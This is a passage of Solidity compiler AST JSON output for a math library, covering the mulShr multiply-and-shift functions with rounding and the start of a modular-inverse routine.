Math.Rounding"},"typeName":{"id":2601,"nodeType":"UserDefinedTypeName","pathNode":{"id":2600,"name":"Rounding","nameLocations":["11113:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"11113:8:6"},"referencedDeclaration":2077,"src":"11113:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"11069:62:6"},"returnParameters":{"id":2606,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2605,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2629,"src":"11155:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2604,"name":"uint256","nodeType":"ElementaryTypeName","src":"11155:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11154:9:6"},"scope":3686,"src":"11054:238:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2678,"nodeType":"Block","src":"11500:245:6","statements":[{"id":2677,"nodeType":"UncheckedBlock","src":"11510:229:6","statements":[{"assignments":[2642,2644],"declarations":[{"constant":false,"id":2642,"mutability":"mutable","name":"high","nameLocation":"11543:4:6","nodeType":"VariableDeclaration","scope":2677,"src":"11535:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2641,"name":"uint256","nodeType":"ElementaryTypeName","src":"11535:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2644,"mutability":"mutable","name":"low","nameLocation":"11557:3:6","nodeType":"VariableDeclaration","scope":2677,"src":"11549:11:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2643,"name":"uint256","nodeType":"ElementaryTypeName","src":"11549:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2649,"initialValue":{"arguments":[{"id":2646,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2632,"src":"11571:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2647,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2634,"src":"11574:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2645,"name":"mul512","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2105,"src":"11564:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (uint256,uint256)"}},"id":2648,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11564:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_uint256_$_t_uint256_$","typeString":"tuple(uint256,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"11534:42:6"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2654,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2650,"name":"high","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2642,"src":"11594:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2653,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":2651,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11602:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"id":2652,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2636,"src":"11607:1:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"11602:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11594:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2663,"nodeType":"IfStatement","src":"11590:86:6","trueBody":{"id":2662,"nodeType":"Block","src":"11610:66:6","statements":[{"expression":{"arguments":[{"expression":{"id":2658,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"11640:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2659,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"11646:14:6","memberName":"UNDER_OVERFLOW","nodeType":"MemberAccess","referencedDeclaration":192,"src":"11640:20:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2655,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"11628:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2657,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"11634:5:6","memberName":"panic","nodeType":"MemberAccess","referencedDeclaration":228,"src":"11628:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$__$","typeString":"function (uint256) pure"}},"id":2660,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11628:33:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2661,"nodeType":"ExpressionStatement","src":"11628:33:6"}]}},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2675,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2669,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2664,"name":"high","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2642,"src":"11697:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint16","typeString":"uint16"},"id":2667,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"323536","id":2665,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11706:3:6","typeDescriptions":{"typeIdentifier":"t_rational_256_by_1","typeString":"int_const 256"},"value":"256"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":2666,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2636,"src":"11712:1:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"11706:7:6","typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"}}],"id":2668,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"11705:9:6","typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"}},"src":"11697:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2670,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"11696:19:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2673,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2671,"name":"low","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2644,"src":"11719:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":2672,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2636,"src":"11726:1:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"11719:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2674,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"11718:10:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11696:32:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2640,"id":2676,"nodeType":"Return","src":"11689:39:6"}]}]},"documentation":{"id":2630,"nodeType":"StructuredDocumentation","src":"11298:111:6","text":" @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256."},"id":2679,"implemented":true,"kind":"function","modifiers":[],"name":"mulShr","nameLocation":"11423:6:6","nodeType":"FunctionDefinition","parameters":{"id":2637,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2632,"mutability":"mutable","name":"x","nameLocation":"11438:1:6","nodeType":"VariableDeclaration","scope":2679,"src":"11430:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2631,"name":"uint256","nodeType":"ElementaryTypeName","src":"11430:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2634,"mutability":"mutable","name":"y","nameLocation":"11449:1:6","nodeType":"VariableDeclaration","scope":2679,"src":"11441:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2633,"name":"uint256","nodeType":"ElementaryTypeName","src":"11441:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2636,"mutability":"mutable","name":"n","nameLocation":"11458:1:6","nodeType":"VariableDeclaration","scope":2679,"src":"11452:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":2635,"name":"uint8","nodeType":"ElementaryTypeName","src":"11452:5:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"src":"11429:31:6"},"returnParameters":{"id":2640,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2639,"mutability":"mutable","name":"result","nameLocation":"11492:6:6","nodeType":"VariableDeclaration","scope":2679,"src":"11484:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2638,"name":"uint256","nodeType":"ElementaryTypeName","src":"11484:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11483:16:6"},"scope":3686,"src":"11414:331:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2717,"nodeType":"Block","src":"11963:113:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2715,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2695,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2682,"src":"11987:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2696,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2684,"src":"11990:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2697,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2686,"src":"11993:1:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint8","typeString":"uint8"}],"id":2694,"name":"mulShr","nodeType":"Identifier","overloadedDeclarations":[2679,2718],"referencedDeclaration":2679,"src":"11980:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$_t_uint8_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint8) pure returns (uint256)"}},"id":2698,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11980:15:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2713,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2702,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2689,"src":"12031:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":2701,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"12014:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":2703,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12014:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2712,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2705,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2682,"src":"12051:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2706,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2684,"src":"12054:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2709,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":2707,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12057:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"id":2708,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2686,"src":"12062:1:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"12057:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2704,"name":"mulmod","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-16,"src":"12044:6:6","typeDescriptions":{"typeIdentifier":"t_function_mulmod_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint256) pure returns (uint256)"}},"id":2710,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12044:20:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2711,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12067:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"12044:24:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"12014:54:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2699,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"11998:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2700,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"12007:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"11998:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2714,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11998:71:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11980:89:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2693,"id":2716,"nodeType":"Return","src":"11973:96:6"}]},"documentation":{"id":2680,"nodeType":"StructuredDocumentation","src":"11751:109:6","text":" @dev Calculates x * y >> n with full precision, following the selected rounding direction."},"id":2718,"implemented":true,"kind":"function","modifiers":[],"name":"mulShr","nameLocation":"11874:6:6","nodeType":"FunctionDefinition","parameters":{"id":2690,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2682,"mutability":"mutable","name":"x","nameLocation":"11889:1:6","nodeType":"VariableDeclaration","scope":2718,"src":"11881:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2681,"name":"uint256","nodeType":"ElementaryTypeName","src":"11881:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2684,"mutability":"mutable","name":"y","nameLocation":"11900:1:6","nodeType":"VariableDeclaration","scope":2718,"src":"11892:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2683,"name":"uint256","nodeType":"ElementaryTypeName","src":"11892:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2686,"mutability":"mutable","name":"n","nameLocation":"11909:1:6","nodeType":"VariableDeclaration","scope":2718,"src":"11903:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":2685,"name":"uint8","nodeType":"ElementaryTypeName","src":"11903:5:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"},{"constant":false,"id":2689,"mutability":"mutable","name":"rounding","nameLocation":"11921:8:6","nodeType":"VariableDeclaration","scope":2718,"src":"11912:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":2688,"nodeType":"UserDefinedTypeName","pathNode":{"id":2687,"name":"Rounding","nameLocations":["11912:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"11912:8:6"},"referencedDeclaration":2077,"src":"11912:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"11880:50:6"},"returnParameters":{"id":2693,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2692,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2718,"src":"11954:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2691,"name":"uint256","nodeType":"ElementaryTypeName","src":"11954:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11953:9:6"},"scope":3686,"src":"11865:211:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2814,"nodeType":"Block","src":"12710:1849:6","statements":[{"id":2813,"nodeType":"UncheckedBlock","src":"12720:1833:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2730,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2728,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2723,"src":"12748:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":2729,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12753:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"12748:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2733,"nodeType":"IfStatement","src":"12744:20:6","trueBody":{"expression":{"hexValue":"30","id":2731,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12763:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"functionReturnParameters":2727,"id":2732,"nodeType":"Return","src":"12756:8:6"}},{"assignments":[2735],"declarations":[{"constant":false,"id":2735,"mutability":"mutable","name":"remainder","nameLocation":"13243:9:6","nodeType":"VariableDeclaration","scope":2813,"src":"13235:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2734,"name":"uint256","nodeType":"ElementaryTypeName","src":"13235:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2739,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2738,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2736,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2721,"src":"13255:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"%","rightExpression":{"id":2737,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2723,"src":"13259:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13255:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"13235:25:6"},{"assignments":[2741],"declarations":[{"constant":false,"id":2741,"mutability":"mutable","name":"gcd","nameLocation":"13282:3:6","nodeType":"VariableDeclaration","scope":2813,"src":"13274:11:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2740,"name":"uint256","nodeType":"ElementaryTypeName","src":"13274:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2743,"initialValue":{"id":2742,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2723,"src":"13288:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"13274:15:6"},{"assignments":[2745],"declarations":[{"constant":false,"id":2745,"mutability":"mutable","name":"x","nameLocation":"13432:1:6","nodeType":"VariableDeclaration","scope":2813,"src":"13425:8:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":2744,"name":"int256","nodeType":"ElementaryTypeName","src":"13425:6:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"id":2747,"initialValue":{"hexValue":"30","id":2746,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13436:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"13425:12:6"},{"assignments":[2749],"declarations":[{"constant":false,"id":2749,"mutability":"mutable","name":"y","nameLocation":"13458:1:6","nodeType":"VariableDeclaration","scope":2813,"src":"13451:8:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":2748,"name":"int256","nodeType":"ElementaryTypeName","src":"13451:6:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"id":2751,"initialValue":{"hexValue":"31","id":2750,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13462:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"VariableDeclarationStatement","src":"13451:12:6"},{"body":{"id":2788,"nodeType":"Block","src":"13501:882:6","statements":[{"assignments":[2756],"declarations":[{"constant":false,"id":2756,"mutability":"mutable","name":"quotient","nameLocation":"13527:8:6","nodeType":"VariableDeclaration","scope":2788,"src":"13519:16:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2755,"name":"uint256","nodeType":"ElementaryTypeName","src":"13519:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2760,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2759,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2757,"name":"gcd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2741,"src":"13538:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2758,"name":"remainder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2735,"src":"13544:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13538:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"13519:34:6"},{"expression":{"id":2771,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"components":[{"id":2761,"name":"gcd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2741,"src":"13573:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2762,"name":"remainder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2735,"src":"13578:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2763,"isConstant":false,"isInlineArray":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"TupleExpression","src":"13572:16:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_uint256_$_t_uint256_$","typeString":"tuple(uint256,uint256)"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"components":[{"id":2764,"name":"remainder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2735,"src":"13678:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2769,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2765,"name":"gcd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2741,"src":"13923:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2768,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2766,"name":"remainder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2735,"src":"13929:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2767,"name":"quotient","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2756,"src":"13941:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13929:20:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13923:26:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2770,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"13591:376:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_uint256_$_t_uint256_$","typeString":"tuple(uint256,uint256)"}},"src":"13572:395:6","typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2772,"nodeType":"ExpressionStatement","src":"13572:395:6"},{"expression":{"id":2786,"isConstant":false,"isLValue":false,"isPure":false,"lValue